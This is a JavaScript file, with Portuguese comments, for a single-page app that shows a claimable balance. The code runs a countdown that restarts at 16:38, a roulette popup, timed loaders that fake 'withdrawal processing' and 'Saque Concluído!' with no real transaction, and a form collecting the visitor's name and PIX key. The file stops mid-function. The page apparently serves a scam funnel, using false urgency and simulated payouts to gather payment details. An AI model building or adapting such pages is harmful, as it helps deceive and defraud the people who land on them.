/* main.js â€” SPA router + contadores + loader + modal popup (abre 3s em #one)
   VersÃ£o unificada: o schedulePopupForOne() estÃ¡ no mesmo escopo de showScreen().
*/
(function () {
  /* ---------------------------
     VariÃ¡veis / helpers de modal
     --------------------------- */
  let modalTimer = null;
  let activeModalId = null;

  function showModal(id) {
    const modal = document.getElementById(id);
    if (!modal) return;

    activeModalId = id;
    modal.classList.add("is-modal", "is-active");
    modal.removeAttribute("aria-hidden");

    // Captura a posiÃ§Ã£o atual do scroll APENAS se ainda nÃ£o estiver travado
    if (!document.body.classList.contains("modal-open")) {
      const scrollY = window.scrollY;
      document.body.style.position = "fixed";
      document.body.style.top = `-${scrollY}px`;
      document.body.style.width = "100%";

      document.body.classList.add("modal-open");
      document.documentElement.classList.add("modal-open");
    }

    // Habilita o botÃ£o .btn-sacar em #one somente quando o primeiro popup (id="two") abrir
    if (id === "two") {
      const btnOneSacar = document.querySelector(
        "#one .container-saldo .btn-sacar"
      );
      if (btnOneSacar) {
        btnOneSacar.removeAttribute("disabled");
        btnOneSacar.style.pointerEvents = "auto";
        btnOneSacar.style.opacity = "";
      }

      // Anima o contador do popup quando ele for exibido
      setTimeout(() => {
        const popupCounter = modal.querySelector(
          ".valor-currency[data-amount-target]"
        );
        if (
          popupCounter &&
          typeof window.animateCurrencyCounter === "function"
        ) {
          // Reseta o texto para 0 antes de animar e forÃ§a re-animaÃ§Ã£o
          popupCounter.textContent = "R$ 0,00";
          window.animateCurrencyCounter(popupCounter, true); // true = forceReset
        }
      }, 50);
    }

    // overlay click: DESABILITADO - popups sÃ³ fecham por botÃµes especÃ­ficos
    function overlayClickHandler(ev) {
      // Nenhum popup fecha ao clicar fora
      // Todos os popups sÃ³ fecham atravÃ©s de botÃµes especÃ­ficos
      return;
    }
    modal.addEventListener("click", overlayClickHandler);
    modal._overlayHandler = overlayClickHandler;

    // fechar por botÃµes com data-modal-close
    const closeButtons = Array.from(
      modal.querySelectorAll("[data-modal-close]")
    );
    modal._closeButtonHandlers = closeButtons.map((btn) => {
      const h = (ev) => {
        ev && ev.preventDefault();
        closeModal(id);
      };
      btn.addEventListener("click", h);
      return { btn, h };
    });

    // foco para primeiro elemento do modal
    const focusable = modal.querySelector(
      'button, a, input, [tabindex]:not([tabindex="-1"])'
    );
    if (focusable) focusable.focus();
  }

  function closeModal(id) {
    const modal = document.getElementById(id);
    if (!modal) return;

    if (modal._overlayHandler)
      modal.removeEventListener("click", modal._overlayHandler);
    if (modal._closeButtonHandlers) {
      modal._closeButtonHandlers.forEach(({ btn, h }) =>
        btn.removeEventListener("click", h)
      );
    }

    modal.classList.remove("is-active", "is-modal");
    modal.setAttribute("aria-hidden", "true");

    // Verifica se ainda existe algum modal aberto
    const remainingModals = document.querySelectorAll(
      ".screen.is-modal.is-active"
    );
    if (remainingModals.length === 0) {
      // SÃ³ destrava se nÃ£o houver mais nenhum modal
      const scrollY = document.body.style.top;
      document.body.style.position = "";
      document.body.style.top = "";
      document.body.style.width = "";
      window.scrollTo(0, parseInt(scrollY || "0") * -1);

      document.body.classList.remove("modal-open");
      document.documentElement.classList.remove("modal-open");
    }

    activeModalId = null;

    // foco volta pra #one se existir
    const screenOne = document.getElementById("one");
    if (screenOne) {
      const f = screenOne.querySelector(
        'button, a, input, [tabindex]:not([tabindex="-1"])'
      );
      if (f) f.focus();
    }
  }

  function schedulePopupForOne() {
    clearModalTimer();
    modalTimer = setTimeout(() => {
      const one = document.getElementById("one");
      if (one && one.classList.contains("is-active")) {
        showModal("promo-screen");
      }
    }, 0);
  }

  function clearModalTimer() {
    if (modalTimer) {
      clearTimeout(modalTimer);
      modalTimer = null;
    }
  }

  // limpa timer ao sair da pÃ¡gina
  window.addEventListener("beforeunload", clearModalTimer);

  /* ---------------------------
     Contadores (evergreen) â€” mantidos
     --------------------------- */
  function iniciarContadorInline(tempoTotal) {
    const timerElement = document.getElementById("timer");
    const textElement = document.getElementById("countdown-text");
    if (!timerElement || !textElement) return;

    let tempoRestante = tempoTotal;
    let contador = setInterval(() => {
      if (tempoRestante < 0) {
        clearInterval(contador);
        textElement.textContent = "SEU SALDO EXPIROU";
        return;
      }
      let minutos = Math.floor(tempoRestante / 60);
      let segundos = tempoRestante % 60;
      timerElement.textContent = `00 - ${String(minutos).padStart(
        2,
        "0"
      )} - ${String(segundos).padStart(2, "0")}`;
      tempoRestante--;
    }, 1000);
  }

  function iniciarContadorPopup(tempoTotal) {
    const todosOsTimersPopup = document.querySelectorAll(".expira-em-popup");
    if (!todosOsTimersPopup.length) return;

    todosOsTimersPopup.forEach((timerContainer, index) => {
      const minutesElement = timerContainer.querySelector(
        '[data-timer="minutes"]'
      );
      const secondsElement = timerContainer.querySelector(
        '[data-timer="seconds"]'
      );
      const labelElement = timerContainer.querySelector(".timer-label");
      if (!minutesElement || !secondsElement || !labelElement) return;

      let tempoRestante = tempoTotal;
      let contador = setInterval(() => {
        if (tempoRestante < 0) {
          clearInterval(contador);
          labelElement.textContent = "Expirado";
          minutesElement.textContent = "00";
          secondsElement.textContent = "00";
          return;
        }
        let minutos = Math.floor(tempoRestante / 60);
        let segundos = tempoRestante % 60;
        minutesElement.textContent = String(minutos).padStart(2, "0");
        secondsElement.textContent = String(segundos).padStart(2, "0");
        tempoRestante--;
      }, 1000);
    });
  }

  /* ---------------------------
     Loader (barra de progresso)
     --------------------------- */
  /* ---------------------------
     Loader (barra de progresso)
     --------------------------- */
  let loaderState = {
    timeouts: [],
    interval: null,
  };

  function resetLoader() {
    const loadingText = document.getElementById("loading-text");
    const progressBar = document.getElementById("progress-bar");
    if (!loadingText || !progressBar) return;

    // Clear all scheduled timeouts
    loaderState.timeouts.forEach((t) => clearTimeout(t));
    loaderState.timeouts = [];

    if (loaderState.interval) {
      clearInterval(loaderState.interval);
      loaderState.interval = null;
    }

    // Reset UI
    progressBar.style.transition = "none";
    progressBar.style.width = "0%";
    loadingText.textContent = "Iniciando...";
    loadingText.style.opacity = "1";
  }

  function startLoader() {
    const loadingText = document.getElementById("loading-text");
    const progressBar = document.getElementById("progress-bar");
    if (!loadingText || !progressBar) return;

    resetLoader(); // Ensure clean state

    const steps = [
      { text: "Validando suas informaÃ§Ãµes", progress: 25 },
      { text: "Concluindo saque", progress: 50 },
      { text: "Processando transaÃ§Ã£o", progress: 75 },
      { text: "Finalizando", progress: 100 },
    ];
    const stepDuration = 3000,
      textFadeDuration = 400,
      dotAnimationSpeed = 800;

    let currentStep = 0;

    // Restore transition
    // Force reflow before adding transition back
    void progressBar.offsetWidth;
    progressBar.style.transition = `width ${stepDuration / 1000}s linear`;

    function scheduleNextStep() {
      if (currentStep < steps.length) {
        if (loaderState.interval) clearInterval(loaderState.interval);

        loadingText.style.opacity = 0;

        const t1 = setTimeout(() => {
          const step = steps[currentStep];
          const baseText = step.text;
          loadingText.textContent = baseText;
          // Calcula a largura considerando o padding de 20px de cada lado
          const containerWidth = progressBar.parentElement.offsetWidth - 40; // 20px de cada lado
          progressBar.style.width =
            (containerWidth * step.progress) / 100 + "px";
          loadingText.style.opacity = 1;

          let dotCount = 0;
          loaderState.interval = setInterval(() => {
            dotCount = (dotCount % 3) + 1;
            loadingText.textContent = baseText + ".".repeat(dotCount);
          }, dotAnimationSpeed);

          currentStep++;
          const t2 = setTimeout(scheduleNextStep, stepDuration);
          loaderState.timeouts.push(t2);
        }, textFadeDuration);
        loaderState.timeouts.push(t1);
      } else {
        if (loaderState.interval) clearInterval(loaderState.interval);
        loadingText.style.opacity = 0;

        const t3 = setTimeout(() => {
          loadingText.textContent = "Saque ConcluÃ­do!";
          loadingText.style.opacity = 1;
        }, textFadeDuration);
        loaderState.timeouts.push(t3);
      }
    }

    // Start
    const tStart = setTimeout(scheduleNextStep, 500);
    loaderState.timeouts.push(tStart);
  }

  // Expose globally
  window.startLoader = startLoader;
  window.resetLoader = resetLoader;

  /* ---------------------------
     Nova animaÃ§Ã£o de loading (#seven)
     --------------------------- */
  /* ---------------------------
     Nova animaÃ§Ã£o de loading (#seven)
     --------------------------- */
  let newLoadingState = {
    interval: null,
    timeouts: [],
  };

  function startNewLoadingAnimation() {
    const loadingText = document.getElementById("new-loading-text");
    const progressBar = document.getElementById("new-progress-bar");

    if (!loadingText || !progressBar) return;

    // Reset state
    resetNewLoadingAnimation();

    // Force faster transition to match new speed
    progressBar.style.transition = "width 1.3s ease-in-out";

    const texts = [
      "Validando dados...",
      "Conectando ao servidor...",
      "Concluindo resgate...",
      "Quase pronto...",
    ];

    // Set initial text immediately
    loadingText.textContent = texts[0];

    let currentIndex = 0;
    const totalSteps = texts.length;
    const progressPerStep = 100 / totalSteps;

    function updateProgress() {
      const progress = (currentIndex + 1) * progressPerStep;
      progressBar.style.width = `${progress}%`;
    }

    // Inicializar progresso
    updateProgress();

    function changeText() {
      loadingText.style.opacity = 0;

      const t1 = setTimeout(() => {
        currentIndex++;
        loadingText.textContent = texts[currentIndex];
        loadingText.style.opacity = 1;

        // Atualizar progresso com transiÃ§Ã£o suave
        updateProgress();
      }, 150);
      newLoadingState.timeouts.push(t1);
    }

    // Loop de textos
    newLoadingState.interval = setInterval(() => {
      if (currentIndex >= totalSteps - 1) {
        // Chegou no Ãºltimo passo ("Quase pronto...")
        clearInterval(newLoadingState.interval);

        // Finaliza e redireciona
        const tEnd = setTimeout(() => {
          if (typeof window.showScreen === "function") {
            window.showScreen("nine");
          } else {
            location.hash = "#nine";
          }
        }, 700);
        newLoadingState.timeouts.push(tEnd);
        return;
      }
      changeText();
    }, 1600);
  }

  function resetNewLoadingAnimation() {
    const loadingText = document.getElementById("new-loading-text");
    const progressBar = document.getElementById("new-progress-bar");

    if (newLoadingState.interval) {
      clearInterval(newLoadingState.interval);
      newLoadingState.interval = null;
    }
    newLoadingState.timeouts.forEach((t) => clearTimeout(t));
    newLoadingState.timeouts = [];

    if (loadingText) {
      loadingText.textContent = "Validando acesso...";
      loadingText.style.opacity = 1;
    }
    if (progressBar) {
      progressBar.style.transition = "none";
      progressBar.style.width = "0%";
      // ForÃ§a reflow
      void progressBar.offsetWidth;
      progressBar.style.transition =
        "width 1.2s cubic-bezier(0.25, 0.46, 0.45, 0.94)";
    }
  }

  // Expose globally
  window.startNewLoadingAnimation = startNewLoadingAnimation;
  window.resetNewLoadingAnimation = resetNewLoadingAnimation;

  /* ---------------------------
     FunÃ§Ã£o para preencher pÃ¡gina de confirmaÃ§Ã£o (#nine)
     --------------------------- */
  function fillConfirmationPage() {
    // Tenta pegar do objeto global ou do localStorage
    let formData = window.__formData;
    if (!formData) {
      try {
        const stored = localStorage.getItem("userPixData");
        if (stored) {
          formData = JSON.parse(stored);
        }
      } catch (e) {
        console.error("Erro ao ler localStorage", e);
      }
    }

    if (!formData) return;

    // FunÃ§Ã£o para formatar data atual
    function getCurrentDate() {
      const now = new Date();
      const day = String(now.getDate()).padStart(2, "0");
      const month = String(now.getMonth() + 1).padStart(2, "0");
      const year = now.getFullYear();
      return `${day}/${month}/${year}`;
    }

    // Preenche o nome
    const nameElement = document.getElementById("confirmation-name");
    if (nameElement && formData.nome) {
      nameElement.textContent = formData.nome;
    }

    // Preenche a data atual
    const dateElement = document.getElementById("confirmation-date");
    if (dateElement) {
      dateElement.textContent = getCurrentDate();
    }

    // Preenche o tipo de chave PIX
    const keyTypeElement = document.getElementById("confirmation-key-type");
    if (keyTypeElement && formData.tipoChave) {
      keyTypeElement.textContent = formData.tipoChave;
    }

    // Preenche a chave PIX digitada
    const pixKeyElement = document.getElementById("confirmation-pix-key");
    if (pixKeyElement && formData.chavePix) {
      // O valor jÃ¡ deve estar formatado do input, mas garante formataÃ§Ã£o se necessÃ¡rio
      let formattedKey = formData.chavePix;

      if (formData.tipoChave === "CPF") {
        // Se nÃ£o estiver formatado, formata
        if (!formattedKey.includes(".") && !formattedKey.includes("-")) {
          const cleanCPF = formattedKey.replace(/\D/g, "");
          if (cleanCPF.length === 11) {
            formattedKey = cleanCPF
              .replace(/(\d{3})(\d)/, "$1.$2")
              .replace(/(\d{3})(\d)/, "$1.$2")
              .replace(/(\d{3})(\d{1,2})$/, "$1-$2");
          }
        }
      } else if (formData.tipoChave === "Celular") {
        // Formata celular se necessÃ¡rio (opcional, geralmente jÃ¡ vem formatado)
        const cleanPhone = formattedKey.replace(/\D/g, "");
        if (
          cleanPhone.length >= 10 &&
          cleanPhone.length <= 11 &&
          !formattedKey.includes("(")
        ) {
          if (cleanPhone.length === 11) {
            formattedKey = cleanPhone.replace(
              /(\d{2})(\d{5})(\d{4})/,
              "($1) $2-$3"
            );
          } else if (cleanPhone.length === 10) {
            formattedKey = cleanPhone.replace(
              /(\d{2})(\d{4})(\d{4})/,
              "($1) $2-$3"
            );
          }
        }
      }
      // Para E-mail e Chave AleatÃ³ria, mantÃ©m como estÃ¡

      pixKeyElement.textContent = formattedKey;
    }
  }

  // Expose globally
  window.fillConfirmationPage = fillConfirmationPage;

  /* ---------------------------
     SPA Router (inicia screens e navegaÃ§Ã£o)
     --------------------------- */
  function initRouter() {
    const screens = Array.from(document.querySelectorAll("#screens .screen"));
    if (!screens.length) return;

    function showScreen(id, push = true) {
      const target = document.getElementById(id);
      if (!target) {
        console.warn(`Tela "${id}" nÃ£o encontrada.`);
        return;
      }

      screens.forEach((s) => {
        if (s === target) {
          s.classList.add("is-active");
          s.removeAttribute("aria-hidden");
        } else {
          s.classList.remove("is-active");
          s.setAttribute("aria-hidden", "true");
        }
      });

      if (push) {
        try {
          history.pushState({ screen: id }, "", "#" + id);
        } catch (e) {
          location.hash = id;
        }
      }

      // Scroll to top when showing a new screen
      window.scrollTo(0, 0);
      document.documentElement.scrollTop = 0;
      document.body.scrollTop = 0;

      // Para #nine, forÃ§a scroll para o topo apÃ³s renderizaÃ§Ã£o
      if (id === "nine") {
        // Scroll imediato
        window.scrollTo({ top: 0, left: 0, behavior: "instant" });
        document.documentElement.scrollTop = 0;
        document.body.scrollTop = 0;

        // Scroll novamente apÃ³s renderizaÃ§Ã£o para garantir
        setTimeout(() => {
          window.scrollTo({ top: 0, left: 0, behavior: "instant" });
          document.documentElement.scrollTop = 0;
          document.body.scrollTop = 0;
          const nineElement = document.getElementById("nine");
          if (nineElement) {
            nineElement.scrollTop = 0;
            // TambÃ©m forÃ§a scroll no container se houver
            const container = nineElement.querySelector(
              ".confirmation-container"
            );
            if (container) {
              container.scrollTop = 0;
            }
          }
        }, 100);
      }

      const focusable = target.querySelector(
        'button, a, input, select, textarea, [tabindex]:not([tabindex="-1"])'
      );
      if (focusable) focusable.focus({ preventScroll: true });

      // >>> Aqui garantimos que o popup seja agendado quando entrarmos em #one
      if (id === "one") {
        schedulePopupForOne();
      } else {
        clearModalTimer();

        // Garante que o sticky popup suma ao sair da #one
        const stickyPopup = document.getElementById("popup-um");
        if (stickyPopup) {
          stickyPopup.classList.remove("is-visible");
        }

        // Se for para #seven, fecha todos os modais e inicia novo loader
        if (id === "seven") {
          const modalIds = ["two", "four", "five", "six"];
          modalIds.forEach((modalId) => {
            const modal = document.getElementById(modalId);
            if (modal && modal.classList.contains("is-modal")) {
              closeModal(modalId);
            }
          });
          // Inicia a nova animaÃ§Ã£o de loading
          if (typeof startNewLoadingAnimation === "function") {
            startNewLoadingAnimation();
          }
        } else {
          // Se nÃ£o for #seven, reseta o loader
          if (typeof window.resetLoader === "function") {
            window.resetLoader();
          }

          // Reseta a nova animaÃ§Ã£o de loading se estiver ativa
          if (typeof resetNewLoadingAnimation === "function") {
            resetNewLoadingAnimation();
          }

          if (activeModalId) {
            closeModal(activeModalId);
          }
        }
      }

      // Anima contador da tela #three quando ela for exibida
      if (
        id === "three" &&
        typeof window.animateCurrencyCounter === "function"
      ) {
        // Usa um timeout maior para garantir que a tela estÃ¡ totalmente renderizada
        // e cancela qualquer timeout anterior para evitar mÃºltiplas animaÃ§Ãµes
        if (target._threeAnimationTimeout) {
          clearTimeout(target._threeAnimationTimeout);
        }
        target._threeAnimationTimeout = setTimeout(() => {
          const threeCounter = target.querySelector(
            ".valor-currency[data-amount-target]"
          );
          if (threeCounter) {
            // Garante que o elemento ainda estÃ¡ visÃ­vel antes de animar
            if (target.classList.contains("is-active")) {
              window.animateCurrencyCounter(threeCounter, true); // true = forceReset
            }
          }
          target._threeAnimationTimeout = null;
        }, 100);
      }

      // Preenche dados na pÃ¡gina de confirmaÃ§Ã£o (#nine) quando ela for exibida
      if (id === "nine") {
        // Garante que a pÃ¡gina apareÃ§a no topo
        window.scrollTo(0, 0);
        document.documentElement.scrollTop = 0;
        document.body.scrollTop = 0;

        // Preenche imediatamente para evitar flash de conteÃºdo vazio
        fillConfirmationPage();

        setTimeout(() => {
          // ForÃ§a scroll para o topo novamente apÃ³s renderizaÃ§Ã£o
          window.scrollTo(0, 0);
          document.documentElement.scrollTop = 0;
          document.body.scrollTop = 0;
          const nineElement = document.getElementById("nine");
          if (nineElement) {
            nineElement.scrollTop = 0;
          }

          // AnimaÃ§Ã£o do saldo (pode ficar no timeout ou fora, mas fora Ã© mais garantido de iniciar logo)
          const confirmationBalance = document.querySelector(
            ".confirmation-balance-amount[data-amount-target]"
          );
          if (
            confirmationBalance &&
            typeof window.animateCurrencyCounter === "function"
          ) {
            window.animateCurrencyCounter(confirmationBalance, true);
          }
        }, 150);
      }
    }

    window.addEventListener("popstate", (ev) => {
      const id =
        (ev.state && ev.state.screen) ||
        location.hash.replace("#", "") ||
        screens[0].id;
      showScreen(id, /*push*/ false);
    });

    // inicial: usa hash ou primeira screen
    const initial = location.hash.replace("#", "") || screens[0].id;
    showScreen(initial, /*push*/ false);

    // expÃµe globalmente se precisar (Ãºtil pra debugging)
    window.showScreen = showScreen;
  }

  // Se preferir JS: torna o botÃ£o .btn-sacar um link para a screen 'three'

  document.addEventListener("DOMContentLoaded", () => {
    const btnSacar =
      document.querySelector("#one .container-saldo .btn-sacar") ||
      document.querySelector(".btn-sacar");
    if (btnSacar) {
      btnSacar.addEventListener("click", function (ev) {
        ev.preventDefault();
        // fecha modal/timers caso haja algum aberto
        if (typeof clearModalTimer === "function") clearModalTimer();
        if (typeof closeModal === "function" && activeModalId)
          closeModal(activeModalId);

        // ABRE O POPUP DA ROLETA (#two)
        if (typeof showModal === "function") {
          // Agora abre direto o #two (roleta)
          showModal("two");
        } else if (
          window.__spa_modal_helpers &&
          typeof window.__spa_modal_helpers.showModal === "function"
        ) {
          window.__spa_modal_helpers.showModal("two");
        } else {
          // Fallback
          location.hash = "#two";
        }
      });
    }
  });

  /* ---------------------------
     InicializaÃ§Ã£o
     --------------------------- */
  document.addEventListener("DOMContentLoaded", () => {
    initRouter();

    // iniciadores de contador (evergreen) â€” ajuste o tempo aqui se quiser
    const tempoInicialEmSegundos = 16 * 60 + 38;
    iniciarContadorInline(tempoInicialEmSegundos);
    iniciarContadorPopup(tempoInicialEmSegundos);

    // initLoaderIfExists(); // Removido para iniciar apenas no #seven

    initStickyPopup();

    // Garante que o popup inicial seja agendado se estivermos na #one
    /*
    const currentHash = location.hash.replace("#", "") || "one";
    if (currentHash === "one") {
      schedulePopupForOne();
    }
    */
  });

  /* ---------------------------
     Sticky Popup Logic
     --------------------------- */
  function initStickyPopup() {
    const saldoSection = document.querySelector("#one .saldo");
    const stickyPopup = document.getElementById("popup-um");
    const screenOne = document.getElementById("one");

    if (!saldoSection || !stickyPopup || !screenOne) return;

    // Configura botÃ£o de sacar do popup para funcionar igual ao principal
    const btnSacarPopup = stickyPopup.querySelector(".btn-sacar");
    if (btnSacarPopup) {
      btnSacarPopup.addEventListener("click", (ev) => {
        ev.preventDefault();
        if (typeof window.showScreen === "function") {
          window.showScreen("three");
        } else {
          location.hash = "#three";
        }
      });
    }

    const observer = new IntersectionObserver(
      (entries) => {
        entries.forEach((entry) => {
          // Se .saldo NÃƒO estÃ¡ intersectando (saiu da tela) E #one estÃ¡ ativo
          if (
            !entry.isIntersecting &&
            screenOne.classList.contains("is-active")
          ) {
            stickyPopup.classList.add("is-visible");
          } else {
            stickyPopup.classList.remove("is-visible");
          }
        });
      },
      {
        threshold: 0, // Dispara assim que qualquer parte sair/entrar
        rootMargin: "-50px 0px 0px 0px", // Ajuste fino para disparar um pouco antes de sumir totalmente
      }
    );

    observer.observe(saldoSection);

    // ExpÃµe para ser usado no router
    window.__stickyObserver = observer;
  }

  // expÃµe helpers para caso queira manipular modal manualmente em console
  window.__spa_modal_helpers = {
    schedulePopupForOne,
    clearModalTimer,
    showModal,
    closeModal,
  };

  /* ---------------------------
     Toast Notification Helper
     --------------------------- */
  function showToast(message, type = "success") {
    let container = document.querySelector(".toast-container");
    if (!container) {
      container = document.createElement("div");
      container.className = "toast-container";
      document.body.appendChild(container);
    }

    const toast = document.createElement("div");
    toast.className = `toast ${type}`;

    // Icon based on type
    let icon = "";
    if (type === "success") {
      icon = `<svg width="20" height="20" viewBox="0 0 20 20" fill="none"><path d="M10 0C4.48 0 0 4.48 0 10C0 15.52 4.48 20 10 20C15.52 20 20 15.52 20 10C20 4.48 15.52 0 10 0ZM8 15L3 10L4.41 8.59L8 12.17L15.59 4.58L17 6L8 15Z" fill="#10B981"/></svg>`;
    } else if (type === "error") {
      icon = `<svg width="20" height="20" viewBox="0 0 20 20" fill="none"><path d="M10 0C4.48 0 0 4.48 0 10C0 15.52 4.48 20 10 20C15.52 20 20 15.52 20 10C20 4.48 15.52 0 10 0ZM11 15H9V13H11V15ZM11 11H9V5H11V11Z" fill="#EF4444"/></svg>`;
    }

    toast.innerHTML = `${icon}<span class="toast-msg">${message}</span>`;

    container.appendChild(toast);

    // Remove after 3s
    setTimeout(() => {
      toast.style.opacity = "0";
      toast.style.transform = "translateY(-10px)";
      setTimeout(() => toast.remove(), 300);
    }, 3000);
  }
  window.showToast = showToast;

  /* ===== DelegaÃ§Ã£o para botÃµes que fecham modal (funciona mesmo se botÃ£o nÃ£o tiver listener) ===== */
  document.body.addEventListener("click", function (ev) {
    const btn = ev.target.closest("[data-modal-close]");
    if (!btn) return;
    ev.preventDefault();

    // procura o modal ancestor (section com class "screen")
    const modalAncestor = btn.closest(".screen");
    const modalId = modalAncestor ? modalAncestor.id : "two";

    // Se closeModal estiver no escopo (dentro da IIFE), usa diretamente.
    // Caso use outra instÃ¢ncia, tenta o helper exposto window.__spa_modal_helpers.closeModal
    if (typeof closeModal === "function") {
      closeModal(modalId);
    } else if (
      window.__spa_modal_helpers &&
      typeof window.__spa_modal_helpers.closeModal === "function"
    ) {
      window.__spa_modal_helpers.closeModal(modalId);
    } else {
      // fallback: tenta esconder a section manualmente
      const modalEl = document.getElementById(modalId);
      if (modalEl) {
        modalEl.classList.remove("is-active", "is-modal");
        modalEl.setAttribute("aria-hidden", "true");
        document.body.classList.remove("modal-open");
      }
    }
  });

  /* ===== DelegaÃ§Ã£o para abrir modais (pix-item abre #five) ===== */
  /* ===== DelegaÃ§Ã£o para abrir modais (pix-item abre #five) ===== */
  document.body.addEventListener("click", function (ev) {
    const opener = ev.target.closest("[data-open-modal]");
    if (!opener) return;

    const modalId = opener.getAttribute("data-open-modal");
    if (!modalId) return;

    ev.preventDefault();
    ev.stopPropagation();

    // LÃ³gica especÃ­fica para abrir o modal de seleÃ§Ã£o de PIX (#six)
    if (modalId === "six") {
      const selectorText = document.getElementById("pix-selector-text");
      if (selectorText) {
        const currentType = selectorText.textContent.trim();

        // Mapeamento de Texto -> ID do Radio
        const typeToId = {
          CPF: "key-cpf",
          "E-mail": "key-email",
          Celular: "key-celular",
          "Chave AleatÃ³ria": "key-aleatoria",
        };

        const radioId = typeToId[currentType];
        if (radioId) {
          const radio = document.getElementById(radioId);
          if (radio) radio.checked = true;
        }
      }
    }

    // Abre o modal usando a funÃ§Ã£o showModal
    if (typeof showModal === "function") {
      showModal(modalId);
    } else if (
      window.__spa_modal_helpers &&
      typeof window.__spa_modal_helpers.showModal === "function"
    ) {
      window.__spa_modal_helpers.showModal(modalId);
    }
  });

  // Suporte para tecla Enter no pix-item (acessibilidade)
  document.body.addEventListener("keydown", function (ev) {
    if (ev.key !== "Enter" && ev.key !== " ") return;

    const opener = ev.target.closest("[data-open-modal]");
    if (!opener) return;

    const modalId = opener.getAttribute("data-open-modal");
    if (!modalId) return;

    ev.preventDefault();
    ev.stopPropagation();

    if (typeof showModal === "function") {
      showModal(modalId);
    } else if (
      window.__spa_modal_helpers &&
      typeof window.__spa_modal_helpers.showModal === "function"
    ) {
      window.__spa_modal_helpers.showModal(modalId);
    }
  });

  /* ===== FunÃ§Ã£o para fechar todos os modais abertos ===== */
  function closeAllModals() {
    const modalIds = ["two", "four", "five", "six"];
    modalIds.forEach((modalId) => {
      const modal = document.getElementById(modalId);
      if (modal && modal.classList.contains("is-modal")) {
        if (typeof closeModal === "function") {
          closeModal(modalId);
        } else if (
          window.__spa_modal_helpers &&
          typeof window.__spa_modal_helpers.closeModal === "function"
        ) {
          window.__spa_modal_helpers.closeModal(modalId);
        } else {
          // fallback: fecha manualmente
          modal.classList.remove("is-active", "is-modal");
          modal.setAttribute("aria-hidden", "true");
          document.body.classList.remove("modal-open");
        }
      }
    });
    activeModalId = null;
  }

  /* ===== LÃ³gica de SeleÃ§Ã£o de Chave PIX e ValidaÃ§Ã£o ===== */

  // Helpers de ValidaÃ§Ã£o
  function validateCPF(cpf) {
    cpf = cpf.replace(/[^\d]+/g, "");
    if (cpf.length !== 11 || /^(\d)\1+$/.test(cpf)) return false;
    let soma = 0,
      resto;
    for (let i = 1; i <= 9; i++)
      soma += parseInt(cpf.substring(i - 1, i)) * (11 - i);
    resto = (soma * 10) % 11;
    if (resto === 10 || resto === 11) resto = 0;
    if (resto !== parseInt(cpf.substring(9, 10))) return false;
    soma = 0;
    for (let i = 1; i <= 10; i++)
      soma += parseInt(cpf.substring(i - 1, i)) * (12 - i);
    resto = (soma * 10) % 11;
    if (resto === 10 || resto === 11) resto = 0;
    return resto === parseInt(cpf.substring(10, 11));
  }

  function validateEmail(email) {
    return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
  }

  function validatePhone(phone) {
    const cleanPhone = phone.replace(/\D/g, "");
    return cleanPhone.length >= 10 && cleanPhone.length <= 11;
  }

  function validateRandomKey(key) {
    // ValidaÃ§Ã£o simplificada de UUID (32 hex chars + 4 hifens = 36 chars)
    // Formato: 8-4-4-4-12
    return /^[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}$/.test(
      key
    );
  }

  // FunÃ§Ã£o de validaÃ§Ã£o geral
  function checkPixFormValidity() {
    const nomeInput = document.getElementById("nome");
    const keyInput = document.getElementById("pix-key-input");
    const selectorText = document.getElementById("pix-selector-text");
    const btnEnviar = document.getElementById("btn-enviar-pix");

    if (!nomeInput || !keyInput || !selectorText || !btnEnviar) return;

    const isNomeFilled = nomeInput.value.trim().length > 0;
    const selectedType = selectorText.textContent.trim();
    const isTypeSelected = selectedType !== "Escolha o tipo de chave PIX";
    const keyValue = keyInput.value.trim();

    let isKeyValid = false;

    if (isTypeSelected && keyValue.length > 0) {
      switch (selectedType) {
        case "CPF":
          isKeyValid = validateCPF(keyValue);
          break;
        case "E-mail":
          isKeyValid = validateEmail(keyValue);
          break;
        case "Celular":
          isKeyValid = validatePhone(keyValue);
          break;
        case "Chave AleatÃ³ria":
          isKeyValid = validateRandomKey(keyValue);
          break;
        default:
          // Caso genÃ©rico (ex: "Chave")
          isKeyValid = keyValue.length > 0;
      }
    }

    if (isNomeFilled && isTypeSelected && isKeyValid) {
      btnEnviar.classList.remove("btn-disabled");
    } else {
      btnEnviar.classList.add("btn-disabled");
    }
  }

  // Listeners para validaÃ§Ã£o em tempo real
  const nomeInput = document.getElementById("nome");
  if (nomeInput) {
    nomeInput.addEventListener("input", checkPixFormValidity);
  }

  // 1. SeleÃ§Ã£o do Tipo de Chave (no popup #six)
  document.body.addEventListener("click", function (ev) {
    const optionRow = ev.target.closest("#six .option-row");
    if (!optionRow) return;

    ev.preventDefault();
    ev.stopPropagation();

    // Pega o texto da opÃ§Ã£o selecionada (ex: CPF, E-mail...)
    const optionTextEl = optionRow.querySelector(".option-text");
    const selectedType = optionTextEl
      ? optionTextEl.textContent.trim()
      : "Chave";

    // Atualiza o texto do seletor na tela #five
    const selectorText = document.getElementById("pix-selector-text");
    if (selectorText) {
      selectorText.textContent = selectedType;
      selectorText.style.color = "#000"; // Opcional: mudar cor para indicar seleÃ§Ã£o
    }

    // Habilita o input de chave
    const keyInput = document.getElementById("pix-key-input");
    const keyWrapper = document.getElementById("pix-key-wrapper");

    if (keyInput) {
      keyInput.value = ""; // Limpa o campo ao trocar o tipo
      keyInput.removeAttribute("disabled");
      keyInput.classList.remove("input-disabled");
      keyInput.focus();
    }

    if (keyWrapper) {
      keyWrapper.classList.remove("input-wrapper-disabled");
    }

    // Remove estado de erro do seletor se houver
    const selector = document.getElementById("pix-type-selector");
    if (selector) {
      selector.classList.remove("input-error", "shake-animation");
    }

    // Revalida o formulÃ¡rio apÃ³s seleÃ§Ã£o
    checkPixFormValidity();

    // Fecha o modal de seleÃ§Ã£o (#six)
    // Nota: nÃ£o fecha todos, apenas o #six para voltar ao #five
    if (typeof closeModal === "function") {
      closeModal("six");
    } else if (
      window.__spa_modal_helpers &&
      typeof window.__spa_modal_helpers.closeModal === "function"
    ) {
      window.__spa_modal_helpers.closeModal("six");
    }
  });

  // 2. Feedback visual ao tentar clicar no input desabilitado
  document.body.addEventListener("click", function (ev) {
    // Verifica se clicou no wrapper do input desabilitado
    const wrapper = ev.target.closest("#pix-key-wrapper");
    if (!wrapper) return;

    // Se o input estiver desabilitado (wrapper tem a classe)
    if (wrapper.classList.contains("input-wrapper-disabled")) {
